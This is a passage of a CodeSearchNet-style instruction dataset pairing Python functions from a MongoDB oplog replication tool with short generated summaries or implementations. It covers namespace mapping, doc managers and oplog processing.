):\n            raise errors.InvalidConfiguration(\n                \"The namespace mapping from '%s' to '%s' is invalid. A '*' \"\n                \"that appears in the source database name must also appear\"\n                \"in the target database name. A '*' that appears in the \"\n                \"source collection name must also appear in the target \"\n                \"collection name\" % (source, target)\n            )\n\n    for source1, source2 in combinations(namespaces.keys(), 2):\n        if wildcards_overlap(source1, source2):\n            LOG.warning(\n                'Namespaces \"%s\" and \"%s\" may match the ' \"same source namespace.\",\n                source1,\n                source2,\n            )\n        target1 = namespaces[source1].dest_name\n        target2 = namespaces[source2].dest_name\n        if target1 == target2:\n            raise errors.InvalidConfiguration(\n                \"Multiple namespaces cannot be combined into one target \"\n                \"namespace. Trying to map '%s' to '%s' but '%s' already \"\n                \"corresponds to '%s' in the target system.\"\n                % (source2, target2, source1, target1)\n            )\n        if wildcards_overlap(target1, target2):\n            LOG.warning(\n                \"Multiple namespaces cannot be combined into one target \"\n                \"namespace. Mapping from '%s' to '%s' might overlap \"\n                \"with mapping from '%s' to '%s'.\" % (source2, target2, source1, target1)\n            )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _merge_namespace_options(\n    namespace_set=None,\n    ex_namespace_set=None,\n    gridfs_set=None,\n    dest_mapping=None,\n    namespace_options=None,\n    include_fields=None,\n    exclude_fields=None,\n):\n    \"\"\"Merges namespaces options together.\n\n    The first is the set of excluded namespaces and the second is a mapping\n    from source namespace to Namespace instances.\n    \"\"\"\n    namespace_set = set(namespace_set or [])\n    ex_namespace_set = set(ex_namespace_set or [])\n    gridfs_set = set(gridfs_set or [])\n    dest_mapping = dest_mapping or {}\n    namespace_options = namespace_options or {}\n    include_fields = set(include_fields or [])\n    exclude_fields = set(exclude_fields or [])\n    namespaces = {}\n\n    for source_name, options_or_str in namespace_options.items():\n        if isinstance(options_or_str, dict):\n            namespace_set.add(source_name)\n            if options_or_str.get(\"gridfs\"):\n                gridfs_set.add(source_name)\n            namespaces[source_name] = Namespace(\n                dest_name=options_or_str.get(\"rename\"),\n                include_fields=options_or_str.get(\"includeFields\"),\n                exclude_fields=options_or_str.get(\"excludeFields\"),\n                gridfs=options_or_str.get(\"gridfs\", False),\n            )\n        elif isinstance(options_or_str, str):\n            namespace_set.add(source_name)\n            namespaces[source_name] = Namespace(dest_name=options_or_str)\n        elif options_or_str:\n            namespace_set.add(source_name)\n        else:\n            ex_namespace_set.add(source_name)\n\n    # Add namespaces that are renamed but not in namespace_options\n    for source_name, target_name in dest_mapping.items():\n        namespaces[source_name] = namespaces.get(source_name, Namespace()).with_options(\n            dest_name=target_name\n        )\n\n    # Add namespaces that are included but not in namespace_options\n    for included_name in namespace_set:\n        if included_name not in namespaces:\n            namespaces[included_name] = Namespace()\n\n    # Add namespaces that are excluded but not in namespace_options\n    for gridfs_name in gridfs_set:\n        namespaces[gridfs_name] = namespaces.get(gridfs_name, Namespace()).with_options(\n            gridfs=True\n        )\n\n    # Add source, destination name, and globally included and excluded fields\n    for included_name in namespaces:\n        namespace = namespaces[included_name]\n        namespace = namespace.with_options(\n            source_name=included_name,\n            include_fields=validate_include_fields(\n                include_fields, namespace.include_fields\n            ),\n            exclude_fields=validate_exclude_fields(\n                exclude_fields, namespace.exclude_fields\n            ),\n        )\n        # The default destination name is the same as the source.\n        if not namespace.dest_name:\n            namespace = namespace.with_options(dest_name=included_name)\n        namespaces[included_name] = namespace\n\n    return ex_namespace_set, namespaces", "response": "Merges namespaces options together."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef match_replace_regex(regex, src_namespace, dest_namespace):\n    match = regex.match(src_namespace)\n    if match:\n        return dest_namespace.replace(\"*\", match.group(1))\n    return None", "response": "Return the new mapped namespace if the src_namespace matches the regex."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef namespace_to_regex(namespace):\n    db_name, coll_name = namespace.split(\".\", 1)\n    # A database name cannot contain a '.' character\n    db_regex = re.escape(db_name).replace(r\"\\*\", \"([^.]*)\")\n    # But a collection name can.\n    coll_regex = re.escape(coll_name).replace(r\"\\*\", \"(.*)\")\n    return re.compile(r\"\\A\" + db_regex + r\"\\.\" + coll_regex + r\"\\Z\")", "response": "Create a RegexObject from a wildcard namespace."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _register_namespace_and_command(self, namespace):\n        self._add_namespace(namespace)\n        # Add the namespace for commands on this database\n        cmd_name = namespace.source_name.split(\".\", 1)[0] + \".$cmd\"\n        dest_cmd_name = namespace.dest_name.split(\".\", 1)[0] + \".$cmd\"\n        self._add_namespace(Namespace(dest_name=dest_cmd_name, source_name=cmd_name))", "response": "Add a Namespace and the corresponding command namespace."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nadds an included and possibly renamed Namespace.", "response": "def _add_namespace(self, namespace):\n        \"\"\"Add an included and possibly renamed Namespace.\"\"\"\n        src_name = namespace.source_name\n        if \"*\" in src_name:\n            self._regex_map.append((namespace_to_regex(src_name), namespace))\n        else:\n            self._add_plain_namespace(namespace)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nadds an included and possibly renamed non - wildcard Namespace.", "response": "def _add_plain_namespace(self, namespace):\n        \"\"\"Add an included and possibly renamed non-wildcard Namespace.\"\"\"\n        src_name = namespace.source_name\n        target_name = namespace.dest_name\n        src_names = self._reverse_plain.setdefault(target_name, set())\n        src_names.add(src_name)\n        if len(src_names) > 1:\n            # Another source namespace is already mapped to this target\n            existing_src = (src_names - set([src_name])).pop()\n            raise errors.InvalidConfiguration(\n                \"Multiple namespaces cannot be combined into one target \"\n                \"namespace. Trying to map '%s' to '%s' but there already \"\n                \"exists a mapping from '%s' to '%s'\"\n                % (src_name, target_name, existing_src, target_name)\n            )\n\n        self._plain[src_name] = namespace\n        src_db, _ = src_name.split(\".\", 1)\n        target_db, _ = target_name.split(\".\", 1)\n        self._plain_db.setdefault(src_db, set()).add(target_db)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef lookup(self, plain_src_ns):\n        # Ignore the namespace if it is excluded.\n        if plain_src_ns in self._ex_namespace_set:\n            return None\n        # Include all namespaces if there are no included namespaces.\n        if not self._regex_map and not self._plain:\n            return Namespace(\n                dest_name=plain_src_ns,\n                source_name=plain_src_ns,\n                include_fields=self._include_fields,\n                exclude_fields=self._exclude_fields,\n            )\n        # First, search for the namespace in the plain namespaces.\n        try:\n            return self._plain[plain_src_ns]\n        except KeyError:\n            # Search for the namespace in the wildcard namespaces.\n            for regex, namespace in self._regex_map:\n                new_name = match_replace_regex(regex, plain_src_ns, namespace.dest_name)\n                if not new_name:\n                    continue\n                # Save the new target Namespace in the plain namespaces so\n                # future lookups are fast.\n                new_namespace = namespace.with_options(\n                    dest_name=new_name, source_name=plain_src_ns\n                )\n                self._add_plain_namespace(new_namespace)\n                return new_namespace\n\n        # Save the not included namespace to the excluded namespaces so\n        # that future lookups of the same namespace are fast.\n        self._ex_namespace_set.add(plain_src_ns)\n        return None", "response": "Given a plain source namespace return the corresponding Namespace object or None."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef map_namespace(self, plain_src_ns):\n        namespace = self.lookup(plain_src_ns)\n        if namespace:\n            return namespace.dest_name\n        return None", "response": "Given a plain source namespace return the corresponding plain\n        target namespace."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ngiving a plain source namespace return the corresponding plain target namespace if this namespace is a gridfs collection.", "response": "def gridfs_namespace(self, plain_src_ns):\n        \"\"\"Given a plain source namespace, return the corresponding plain\n        target namespace if this namespace is a gridfs collection.\n        \"\"\"\n        namespace = self.lookup(plain_src_ns)\n        if namespace and namespace.gridfs:\n            return namespace.dest_name\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef unmap_namespace(self, plain_target_ns):\n        # Return the same namespace if there are no included namespaces.\n        if not self._regex_map and not self._plain:\n            return plain_target_ns\n\n        src_name_set = self._reverse_plain.get(plain_target_ns)\n        if src_name_set:\n            # Return the first (and only) item in the set\n            for src_name in src_name_set:\n                return src_name\n        # The target namespace could also exist in the wildcard namespaces\n        for _, namespace in self._regex_map:\n            original_name = match_replace_regex(\n                namespace_to_regex(namespace.dest_name),\n                plain_target_ns,\n                namespace.source_name,\n            )\n            if original_name:\n                return original_name\n        return None", "response": "Given a plain target namespace return the corresponding source\n            namespace."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef map_db(self, plain_src_db):\n        if not self._regex_map and not self._plain:\n            return [plain_src_db]\n        # Lookup this namespace to seed the plain_db dictionary\n        self.lookup(plain_src_db + \".$cmd\")\n        return list(self._plain_db.get(plain_src_db, set()))", "response": "Given a plain source database return the list of target databases."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nreturns the projection for the given source namespace.", "response": "def projection(self, plain_src_name):\n        \"\"\"Return the projection for the given source namespace.\"\"\"\n        mapped = self.lookup(plain_src_name)\n        if not mapped:\n            return None\n        fields = mapped.include_fields or mapped.exclude_fields\n        if fields:\n            include = 1 if mapped.include_fields else 0\n            return dict((field, include) for field in fields)\n        return None"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_included_databases(self):\n        databases = set()\n        databases.update(self._plain_db.keys())\n\n        for _, namespace in self._regex_map:\n            database_name, _ = namespace.source_name.split(\".\", 1)\n            if \"*\" in database_name:\n                return []\n            databases.add(database_name)\n\n        return list(databases)", "response": "Return the databases we want to include or empty list for all."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef parse_args(self, argv=None):\n\n        # parse the command line options\n        parser = optparse.OptionParser(version=\"%prog version: \" + __version__)\n        for option in self.options:\n            for args, kwargs in option.cli_options:\n                cli_option = parser.add_option(*args, **kwargs)\n                option.cli_names.append(cli_option.dest)\n        parsed_options, args = parser.parse_args(argv)\n        if args:\n            raise errors.InvalidConfiguration(\n                \"The following command line arguments are not recognized: \"\n                + \", \".join(args)\n            )\n\n        # load the config file\n        if parsed_options.config_file:\n            try:\n                with open(parsed_options.config_file) as f:\n                    self.load_json(f.read())\n            except (OSError, IOError, ValueError) as exc:\n                tb = sys.exc_info()[2]\n                raise errors.InvalidConfiguration(str(exc)).with_traceback(tb)\n\n        # apply the command line arguments\n        values = parsed_options.__dict__\n        for option in self.options:\n            option.apply_function(\n                option, dict((k, values.get(k)) for k in option.cli_names)\n            )", "response": "Parses command line arguments from stdin or given argv."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nprovide the meta collections currently being used", "response": "def _meta_collections(self):\n        \"\"\"Provides the meta collections currently being used\n        \"\"\"\n        if self.use_single_meta_collection:\n            yield self.meta_collection_name\n        else:\n            for name in self.meta_database.collection_names(\n                include_system_collections=False\n            ):\n                yield name"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, document_id, update_spec, namespace, timestamp):\n        db, coll = self._db_and_collection(namespace)\n\n        meta_collection_name = self._get_meta_collection(namespace)\n\n        self.meta_database[meta_collection_name].replace_one(\n            {self.id_field: document_id, \"ns\": namespace},\n            {self.id_field: document_id, \"_ts\": timestamp, \"ns\": namespace},\n            upsert=True,\n        )\n\n        no_obj_error = \"No matching object found\"\n        update_spec.pop(\"$v\", None)\n        updated = self.mongo[db].command(\n            SON(\n                [\n                    (\"findAndModify\", coll),\n                    (\"query\", {\"_id\": document_id}),\n                    (\"update\", update_spec),\n                    (\"new\", True),\n                ]\n            ),\n            allowable_errors=[no_obj_error],\n        )[\"value\"]\n        return updated", "response": "Update the document with the given id with the given spec."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef upsert(self, doc, namespace, timestamp):\n        database, coll = self._db_and_collection(namespace)\n\n        meta_collection_name = self._get_meta_collection(namespace)\n\n        self.meta_database[meta_collection_name].replace_one(\n            {self.id_field: doc[\"_id\"], \"ns\": namespace},\n            {self.id_field: doc[\"_id\"], \"_ts\": timestamp, \"ns\": namespace},\n            upsert=True,\n        )\n\n        self.mongo[database][coll].replace_one({\"_id\": doc[\"_id\"]}, doc, upsert=True)", "response": "Update or insert a document into Mongo\n           "}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nremove a document from the database.", "response": "def remove(self, document_id, namespace, timestamp):\n        \"\"\"Removes document from Mongo\n\n        The input is a python dictionary that represents a mongo document.\n        The documents has ns and _ts fields.\n        \"\"\"\n        database, coll = self._db_and_collection(namespace)\n\n        meta_collection = self._get_meta_collection(namespace)\n\n        doc2 = self.meta_database[meta_collection].find_one_and_delete(\n            {self.id_field: document_id}\n        )\n        if doc2 and doc2.get(\"gridfs_id\"):\n            GridFS(self.mongo[database], coll).delete(doc2[\"gridfs_id\"])\n        else:\n            self.mongo[database][coll].delete_one({\"_id\": document_id})"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsearches for documents in a time range.", "response": "def search(self, start_ts, end_ts):\n        \"\"\"Called to query Mongo for documents in a time range.\n        \"\"\"\n        for meta_collection_name in self._meta_collections():\n            meta_coll = self.meta_database[meta_collection_name]\n            for ts_ns_doc in meta_coll.find(\n                {\"_ts\": {\"$lte\": end_ts, \"$gte\": start_ts}}\n            ):\n                yield ts_ns_doc"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the last document stored in Mongo.", "response": "def get_last_doc(self):\n        \"\"\"Returns the last document stored in Mongo.\n        \"\"\"\n\n        def docs_by_ts():\n            for meta_collection_name in self._meta_collections():\n                meta_coll = self.meta_database[meta_collection_name]\n                for ts_ns_doc in meta_coll.find(limit=-1).sort(\"_ts\", -1):\n                    yield ts_ns_doc\n\n        return max(docs_by_ts(), key=lambda x: x[\"_ts\"])"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the document with the given id with the given update spec.", "response": "def update(self, document_id, update_spec, namespace, timestamp):\n        \"\"\"Apply updates given in update_spec to the document whose id\n        matches that of doc.\n\n        \"\"\"\n        document = self.doc_dict[document_id].doc\n        updated = self.apply_update(document, update_spec)\n        if \"_id\" in updated:\n            updated.pop(\"_id\")\n        updated[self.unique_key] = document_id\n        self.upsert(updated, namespace, timestamp)\n        return updated"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef upsert(self, doc, namespace, timestamp):\n\n        # Allow exceptions to be triggered (for testing purposes)\n        if doc.get(\"_upsert_exception\"):\n            raise Exception(\"upsert exception\")\n\n        doc_id = doc[\"_id\"]\n        self.doc_dict[doc_id] = Entry(doc=doc, ns=namespace, ts=timestamp)", "response": "Adds a document to the doc dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef insert_file(self, f, namespace, timestamp):\n        doc = f.get_metadata()\n        doc[\"content\"] = f.read()\n        self.doc_dict[f._id] = Entry(doc=doc, ns=namespace, ts=timestamp)", "response": "Inserts a file into the doc dict."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nremove the document from the doc dict.", "response": "def remove(self, document_id, namespace, timestamp):\n        \"\"\"Removes the document from the doc dict.\n        \"\"\"\n        try:\n            entry = self.doc_dict[document_id]\n            entry.doc = None\n            entry.update(namespace, timestamp)\n        except KeyError:\n            raise OperationFailed(\"Document does not exist: %s\" % document_id)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nsearches through all documents and finds all documents that were modified or deleted within the time range.", "response": "def search(self, start_ts, end_ts):\n        \"\"\"Searches through all documents and finds all documents that were\n        modified or deleted within the range.\n\n        Since we have very few documents in the doc dict when this is called,\n        linear search is fine. This method is only used by rollbacks to query\n        all the documents in the target engine within a certain timestamp\n        window. The input will be two longs (converted from Bson timestamp)\n        which specify the time range. The start_ts refers to the timestamp\n        of the last oplog entry after a rollback. The end_ts is the timestamp\n        of the last document committed to the backend.\n        \"\"\"\n        for _id in self.doc_dict:\n            entry = self.doc_dict[_id]\n            if entry.ts <= end_ts or entry.ts >= start_ts:\n                yield entry.meta_dict"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nsearch through the doc dict to find the most recently modified document that was modified or deleted most recently.", "response": "def get_last_doc(self):\n        \"\"\"Searches through the doc dict to find the document that was\n        modified or deleted most recently.\"\"\"\n        return max(self.doc_dict.values(), key=lambda x: x.ts).meta_dict"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _search(self):\n        results = []\n        for _id in self.doc_dict:\n            entry = self.doc_dict[_id]\n            if entry.doc is not None:\n                results.append(entry.merged_dict)\n        return results", "response": "Returns all documents in the doc dict."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndetermines if this oplog entry should be skipped.", "response": "def _should_skip_entry(self, entry):\n        \"\"\"Determine if this oplog entry should be skipped.\n\n        This has the possible side effect of modifying the entry's namespace\n        and filtering fields from updates and inserts.\n        \"\"\"\n        # Don't replicate entries resulting from chunk moves\n        if entry.get(\"fromMigrate\"):\n            return True, False\n\n        # Ignore no-ops\n        if entry[\"op\"] == \"n\":\n            return True, False\n        ns = entry[\"ns\"]\n\n        if \".\" not in ns:\n            return True, False\n        coll = ns.split(\".\", 1)[1]\n\n        # Ignore system collections\n        if coll.startswith(\"system.\"):\n            return True, False\n\n        # Ignore GridFS chunks\n        if coll.endswith(\".chunks\"):\n            return True, False\n\n        is_gridfs_file = False\n        if coll.endswith(\".files\"):\n            ns = ns[: -len(\".files\")]\n            if self.namespace_config.gridfs_namespace(ns):\n                is_gridfs_file = True\n            else:\n                return True, False\n\n        # Commands should not be ignored, filtered, or renamed. Renaming is\n        # handled by the DocManagers via the CommandHelper class.\n        if coll == \"$cmd\":\n            return False, False\n\n        # Rename or filter out namespaces that are ignored keeping\n        # included gridfs namespaces.\n        namespace = self.namespace_config.lookup(ns)\n        if namespace is None:\n            LOG.debug(\n                \"OplogThread: Skipping oplog entry: \"\n                \"'%s' is not in the namespace configuration.\" % (ns,)\n            )\n            return True, False\n\n        # Update the namespace.\n        entry[\"ns\"] = namespace.dest_name\n\n        # Take fields out of the oplog entry that shouldn't be replicated.\n        # This may nullify the document if there's nothing to do.\n        if not self.filter_oplog_entry(\n            entry,\n            include_fields=namespace.include_fields,\n            exclude_fields=namespace.exclude_fields,\n        ):\n            return True, False\n        return False, is_gridfs_file"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef run(self):\n        ReplicationLagLogger(self, 30).start()\n        LOG.debug(\"OplogThread: Run thread started\")\n        while self.running is True:\n            LOG.debug(\"OplogThread: Getting cursor\")\n            cursor, cursor_empty = retry_until_ok(self.init_cursor)\n            # we've fallen too far behind\n            if cursor is None and self.checkpoint is not None:\n                err_msg = \"OplogThread: Last entry no longer in oplog\"\n                effect = \"cannot recover!\"\n                LOG.error(\"%s %s %s\" % (err_msg, effect, self.oplog))\n                self.running = False\n                continue\n\n            if cursor_empty:\n                LOG.debug(\n                    \"OplogThread: Last entry is the one we \"\n                    \"already processed.  Up to date.  Sleeping.\"\n                )\n                time.sleep(1)\n                continue\n\n            last_ts = None\n            remove_inc = 0\n            upsert_inc = 0\n            update_inc = 0\n            try:\n                LOG.debug(\"OplogThread: about to process new oplog entries\")\n                while cursor.alive and self.running:\n                    LOG.debug(\n                        \"OplogThread: Cursor is still\"\n                        \" alive and thread is still running.\"\n                    )\n                    for n, entry in enumerate(cursor):\n                        # Break out if this thread should stop\n                        if not self.running:\n                            break\n\n                        LOG.debug(\n                            \"OplogThread: Iterating through cursor,\"\n                            \" document number in this cursor is %d\" % n\n                        )\n\n                        skip, is_gridfs_file = self._should_skip_entry(entry)\n                        if skip:\n                            # update the last_ts on skipped entries to ensure\n                            # our checkpoint does not fall off the oplog. This\n                            # also prevents reprocessing skipped entries.\n                            last_ts = entry[\"ts\"]\n                            continue\n\n                        # Sync the current oplog operation\n                        operation = entry[\"op\"]\n                        ns = entry[\"ns\"]\n                        timestamp = util.bson_ts_to_long(entry[\"ts\"])\n                        for docman in self.doc_managers:\n                            try:\n                                LOG.debug(\n                                    \"OplogThread: Operation for this \"\n                                    \"entry is %s\" % str(operation)\n                                )\n\n                                # Remove\n                                if operation == \"d\":\n                                    docman.remove(entry[\"o\"][\"_id\"], ns, timestamp)\n                                    remove_inc += 1\n\n                                # Insert\n                                elif operation == \"i\":  # Insert\n                                    # Retrieve inserted document from\n                                    # 'o' field in oplog record\n                                    doc = entry.get(\"o\")\n                                    # Extract timestamp and namespace\n                                    if is_gridfs_file:\n                                        db, coll = ns.split(\".\", 1)\n                                        gridfile = GridFSFile(\n                                            self.primary_client[db][coll], doc\n                                        )\n                                        docman.insert_file(gridfile, ns, timestamp)\n                                    else:\n                                        docman.upsert(doc, ns, timestamp)\n                                    upsert_inc += 1\n\n                                # Update\n                                elif operation == \"u\":\n                                    docman.update(\n                                        entry[\"o2\"][\"_id\"], entry[\"o\"], ns, timestamp\n                                    )\n                                    update_inc += 1\n\n                                # Command\n                                elif operation == \"c\":\n                                    # use unmapped namespace\n                                    doc = entry.get(\"o\")\n                                    docman.handle_command(doc, entry[\"ns\"], timestamp)\n\n                            except errors.OperationFailed:\n                                LOG.exception(\n                                    \"Unable to process oplog document %r\" % entry\n                                )\n                            except errors.ConnectionFailed:\n                                LOG.exception(\n                                    \"Connection failed while processing oplog \"\n                                    \"document %r\" % entry\n                                )\n\n                        if (remove_inc + upsert_inc + update_inc) % 1000 == 0:\n                            LOG.debug(\n                                \"OplogThread: Documents removed: %d, \"\n                                \"inserted: %d, updated: %d so far\"\n                                % (remove_inc, upsert_inc, update_inc)\n                            )\n\n                        LOG.debug(\"OplogThread: Doc is processed.\")\n\n                        last_ts = entry[\"ts\"]\n\n                        # update timestamp per batch size\n                        # n % -1 (default for self.batch_size) == 0 for all n\n                        if n % self.batch_size == 1:\n                            self.update_checkpoint(last_ts)\n                            last_ts = None\n\n                    # update timestamp after running through oplog\n                    if last_ts is not None:\n                        LOG.debug(\n                            \"OplogThread: updating checkpoint after \"\n                            \"processing new oplog entries\"\n                        )\n                        self.update_checkpoint(last_ts)\n\n            except (\n                pymongo.errors.AutoReconnect,\n                pymongo.errors.OperationFailure,\n                pymongo.errors.ConfigurationError,\n            ):\n                LOG.exception(\n                    \"Cursor closed due to an exception. \" \"Will attempt to reconnect.\"\n                )\n\n            # update timestamp before attempting to reconnect to MongoDB,\n            # after being join()'ed, or if the cursor closes\n            if last_ts is not None:\n                LOG.debug(\n                    \"OplogThread: updating checkpoint after an \"\n                    \"Exception, cursor closing, or join() on this\"\n                    \"thread.\"\n                )\n                self.update_checkpoint(last_ts)\n\n            LOG.debug(\n                \"OplogThread: Sleeping. Documents removed: %d, \"\n                \"upserted: %d, updated: %d\" % (remove_inc, upsert_inc, update_inc)\n            )\n            time.sleep(2)", "response": "This method is run in a separate thread."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef join(self):\n        LOG.debug(\"OplogThread: exiting due to join call.\")\n        self.running = False\n        threading.Thread.join(self)", "response": "Stop this thread from managing the oplog."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _find_field(cls, field, doc):\n        path = field.split(\".\")\n        try:\n            for key in path:\n                doc = doc[key]\n            return [(path, doc)]\n        except (KeyError, TypeError):\n            return []", "response": "Find the field in the document which matches the given field. Returns a list of tuples where the first element is the path and the second is the value of the field."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef _find_update_fields(cls, field, doc):\n\n        def find_partial_matches():\n            for key in doc:\n                if len(key) > len(field):\n                    # Handle case where field is a prefix of key, eg field is\n                    # 'a' and key is 'a.b'.\n                    if key.startswith(field) and key[len(field)] == \".\":\n                        yield [key], doc[key]\n                        # Continue searching, there may be multiple matches.\n                        # For example, field 'a' should match 'a.b' and 'a.c'.\n                elif len(key) < len(field):\n                    # Handle case where key is a prefix of field, eg field is\n                    # 'a.b' and key is 'a'.\n                    if field.startswith(key) and field[len(key)] == \".\":\n                        # Search for the remaining part of the field\n                        matched = cls._find_field(field[len(key) + 1 :], doc[key])\n                        if matched:\n                            # Add the top level key to the path.\n                            match = matched[0]\n                            match[0].insert(0, key)\n                            yield match\n                        # Stop searching, it's not possible for any other\n                        # keys in the update doc to match this field.\n                        return\n\n        try:\n            return [([field], doc[field])]\n        except KeyError:\n            # Field does not exactly match any key in the update doc.\n            return list(find_partial_matches())", "response": "Find the fields in the update document which match the given field."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nfilters an oplog entry to only include fields that should not be replicated.", "response": "def filter_oplog_entry(self, entry, include_fields=None, exclude_fields=None):\n        \"\"\"Remove fields from an oplog entry that should not be replicated.\n\n        NOTE: this does not support array indexing, for example 'a.b.2'\"\"\"\n        if not include_fields and not exclude_fields:\n            return entry\n        elif include_fields:\n            filter_fields = self._copy_included_fields\n        else:\n            filter_fields = self._pop_excluded_fields\n\n        fields = include_fields or exclude_fields\n        entry_o = entry[\"o\"]\n        # Version 3.6 of mongodb includes a $v,\n        # see https://jira.mongodb.org/browse/SERVER-32240\n        if \"$v\" in entry_o:\n            entry_o.pop(\"$v\")\n\n        # 'i' indicates an insert. 'o' field is the doc to be inserted.\n        if entry[\"op\"] == \"i\":\n            entry[\"o\"] = filter_fields(entry_o, fields)\n        # 'u' indicates an update. The 'o' field describes an update spec\n        # if '$set' or '$unset' are present.\n        elif entry[\"op\"] == \"u\" and (\"$set\" in entry_o or \"$unset\" in entry_o):\n            if \"$set\" in entry_o:\n                entry[\"o\"][\"$set\"] = filter_fields(entry_o[\"$set\"], fields, update=True)\n            if \"$unset\" in entry_o:\n                entry[\"o\"][\"$unset\"] = filter_fields(\n                    entry_o[\"$unset\"], fields, update=True\n                )\n            # not allowed to have empty $set/$unset, so remove if empty\n            if \"$set\" in entry_o and not entry_o[\"$set\"]:\n                entry_o.pop(\"$set\")\n            if \"$unset\" in entry_o and not entry_o[\"$unset\"]:\n                entry_o.pop(\"$unset\")\n            if not entry_o:\n                return None\n        # 'u' indicates an update. The 'o' field is the replacement document\n        # if no '$set' or '$unset' are present.\n        elif entry[\"op\"] == \"u\":\n            entry[\"o\"] = filter_fields(entry_o, fields)\n\n        return entry"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets a cursor to the oplog after the given timestamp.", "response": "def get_oplog_cursor(self, timestamp=None):\n        \"\"\"Get a cursor to the oplog after the given timestamp, excluding\n        no-op entries.\n\n        If no timestamp is specified, returns a cursor to the entire oplog.\n        \"\"\"\n        query = {\"op\": {\"$ne\": \"n\"}}\n        if timestamp is None:\n            cursor = self.oplog.find(query, cursor_type=CursorType.TAILABLE_AWAIT)\n        else:\n            query[\"ts\"] = {\"$gte\": timestamp}\n            cursor = self.oplog.find(\n                query, cursor_type=CursorType.TAILABLE_AWAIT, oplog_replay=True\n            )\n        return cursor"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_collection(self, namespace):\n        database, coll = namespace.split(\".\", 1)\n        return self.primary_client[database][coll]", "response": "Get a pymongo collection from a namespace."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndumping the current set of collections into the target system.", "response": "def dump_collection(self):\n        \"\"\"Dumps collection into the target system.\n\n        This method is called when we're initializing the cursor and have no\n        configs i.e. when we're starting for the first time.\n        \"\"\"\n\n        timestamp = retry_until_ok(self.get_last_oplog_timestamp)\n        if timestamp is None:\n            return None\n        long_ts = util.bson_ts_to_long(timestamp)\n        # Flag if this oplog thread was cancelled during the collection dump.\n        # Use a list to workaround python scoping.\n        dump_cancelled = [False]\n\n        def get_all_ns():\n            ns_set = []\n            gridfs_ns_set = []\n            db_list = self.namespace_config.get_included_databases()\n            if not db_list:\n                # Only use listDatabases when the configured databases are not\n                # explicit.\n                db_list = retry_until_ok(self.primary_client.database_names)\n            for database in db_list:\n                if database == \"config\" or database == \"local\":\n                    continue\n                coll_list = retry_until_ok(\n                    self.primary_client[database].collection_names\n                )\n                for coll in coll_list:\n                    # ignore system collections\n                    if coll.startswith(\"system.\"):\n                        continue\n                    # ignore gridfs chunks collections\n                    if coll.endswith(\".chunks\"):\n                        continue\n                    if coll.endswith(\".files\"):\n                        namespace = \"%s.%s\" % (database, coll)\n                        namespace = namespace[: -len(\".files\")]\n                        if self.namespace_config.gridfs_namespace(namespace):\n                            gridfs_ns_set.append(namespace)\n                    else:\n                        namespace = \"%s.%s\" % (database, coll)\n                        if self.namespace_config.map_namespace(namespace):\n                            ns_set.append(namespace)\n            return ns_set, gridfs_ns_set\n\n        dump_set, gridfs_dump_set = get_all_ns()\n\n        LOG.debug(\"OplogThread: Dumping set of collections %s \" % dump_set)\n\n        def docs_to_dump(from_coll):\n            last_id = None\n            attempts = 0\n            projection = self.namespace_config.projection(from_coll.full_name)\n            # Loop to handle possible AutoReconnect\n            while attempts < 60:\n                if last_id is None:\n                    cursor = retry_until_ok(\n                        from_coll.find,\n                        projection=projection,\n                        sort=[(\"_id\", pymongo.ASCENDING)],\n                    )\n                else:\n                    cursor = retry_until_ok(\n                        from_coll.find,\n                        {\"_id\": {\"$gt\": last_id}},\n                        projection=projection,\n                        sort=[(\"_id\", pymongo.ASCENDING)],\n                    )\n                try:\n                    for doc in cursor:\n                        if not self.running:\n                            # Thread was joined while performing the\n                            # collection dump.\n                            dump_cancelled[0] = True\n                            raise StopIteration\n                        last_id = doc[\"_id\"]\n                        yield doc\n                    break\n                except (pymongo.errors.AutoReconnect, pymongo.errors.OperationFailure):\n                    